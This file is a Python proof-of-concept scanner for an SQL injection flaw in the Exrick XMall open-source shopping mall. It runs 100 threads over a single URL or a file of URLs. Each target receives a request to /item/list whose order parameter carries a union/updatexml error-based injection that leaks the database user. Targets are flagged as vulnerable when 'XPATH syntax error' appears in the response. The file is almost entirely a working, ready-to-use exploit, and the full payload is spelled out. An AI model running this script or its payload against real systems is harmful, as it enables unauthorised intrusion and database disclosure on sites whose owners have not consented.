import argparse
from multiprocessing.dummy import Pool
import requests

requests.packages.urllib3.disable_warnings()
import sys


def main():
    banner()
    paserse = argparse.ArgumentParser(description="Exrick XMall 开源商城 SQL注入漏洞")
    paserse.add_argument('-u', '--url', help="please input your url")
    paserse.add_argument('-f', '--file', help="please input your file")
    args = paserse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def banner():
    banner = """

$$$$$$$$\                     $$\           $$\             $$\   $$\ $$\      $$\           $$\ $$\ 
$$  _____|                    \__|          $$ |            $$ |  $$ |$$$\    $$$ |          $$ |$$ |
$$ |      $$\   $$\  $$$$$$\  $$\  $$$$$$$\ $$ |  $$\       \$$\ $$  |$$$$\  $$$$ | $$$$$$\  $$ |$$ |
$$$$$\    \$$\ $$  |$$  __$$\ $$ |$$  _____|$$ | $$  |       \$$$$  / $$\$$\$$ $$ | \____$$\ $$ |$$ |
$$  __|    \$$$$  / $$ |  \__|$$ |$$ /      $$$$$$  /        $$  $$<  $$ \$$$  $$ | $$$$$$$ |$$ |$$ |
$$ |       $$  $$<  $$ |      $$ |$$ |      $$  _$$<        $$  /\$$\ $$ |\$  /$$ |$$  __$$ |$$ |$$ |
$$$$$$$$\ $$  /\$$\ $$ |      $$ |\$$$$$$$\ $$ | \$$\       $$ /  $$ |$$ | \_/ $$ |\$$$$$$$ |$$ |$$ |
\________|\__/  \__|\__|      \__| \_______|\__|  \__|      \__|  \__|\__|     \__| \_______|\__|\__|
                                                                                                     
                                                                                                     
                                                                                                     

    """
    print(banner)


def poc(target):
    url = target + '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    try:
        result = requests.get(url=url, timeout=5, verify=False).text
        if 'XPATH syntax error' in result:
            with open('resultEXric.txt', 'a') as fp1:
                fp1.write(f'[+]{target} is veriable' + '\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server error')


if __name__ == '__main__':
    main()